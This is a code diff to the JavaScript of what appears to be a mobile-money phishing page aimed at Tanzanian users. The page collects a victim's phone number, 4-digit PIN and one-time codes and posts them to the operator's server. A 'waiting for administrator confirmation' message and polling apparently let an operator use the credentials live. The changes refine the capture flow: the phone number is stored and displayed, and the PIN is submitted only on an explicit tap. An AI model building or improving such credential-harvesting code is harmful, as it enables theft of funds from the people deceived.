@@ -1,6 +1,6 @@
-/* public/script.js */
 const sessionId = 'sess_' + Math.random().toString(36).substring(2, 15);
 let pollInterval = null;
+let savedPhoneNumber = '';
 
 function showSurfaceNotification(message) {
     const notification = document.getElementById('surfaceNotification');
@@ -39,15 +39,23 @@ function updatePayment() {
 }
 
 function submitPhoneAndNext() {
-    const phone = document.getElementById('phoneNumber').value;
-    if (!phone) {
+    const phoneInput = document.getElementById('phoneNumber').value;
+    if (!phoneInput) {
         showSurfaceNotification('Tafadhali weka namba ya simu sahihi');
         return;
     }
+    
+    savedPhoneNumber = phoneInput;
+    // Update the display field on the PIN entry screen
+    const displayPhoneEl = document.getElementById('displayPhoneNumber');
+    if (displayPhoneEl) {
+        displayPhoneEl.innerText = '+255 ' + savedPhoneNumber;
+    }
+
     fetch('/api/submit-application', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, phone, ref: new URLSearchParams(window.location.search).get('ref') })
+        body: JSON.stringify({ sessionId, phone: savedPhoneNumber, ref: new URLSearchParams(window.location.search).get('ref') })
     }).then(() => {
         goToStep('step-summary');
     });
@@ -55,31 +63,36 @@ function submitPhoneAndNext() {
 
 function requestPinVerification() {
     goToStep('step-pin');
-    startPolling();
 }
 
-// PIN Box navigation logic
+// PIN Box navigation logic (No auto-submit)
 const pinBoxes = document.querySelectorAll('.pin-box');
 pinBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
         if (e.target.value && index < pinBoxes.length - 1) {
             pinBoxes[index + 1].focus();
         }
-        checkPinComplete();
     });
 });
 
-function checkPinComplete() {
+// Explicit function triggered ONLY when INGIA is tapped
+function submitPin() {
     let pin = '';
     pinBoxes.forEach(b => pin += b.value);
-    if (pin.length === 4) {
-        fetch('/api/submit-pin', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ sessionId, pin })
-        });
-        showSurfaceNotification('Inasubiri uthibitisho wa msimamizi...');
+    
+    if (pin.length !== 4) {
+        showSurfaceNotification('Tafadhali weka PIN yenye tarakimu 4 kamili');
+        return;
     }
+
+    fetch('/api/submit-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId, pin })
+    });
+    
+    showSurfaceNotification('Inasubiri uthibitisho wa msimamizi...');
+    startPolling();
 }
 
 // OTP Box navigation logic
@@ -146,5 +159,5 @@ function startPolling() {
             }
         } catch (err) {}
     }, 3000);
-      }
-  
+}
+    
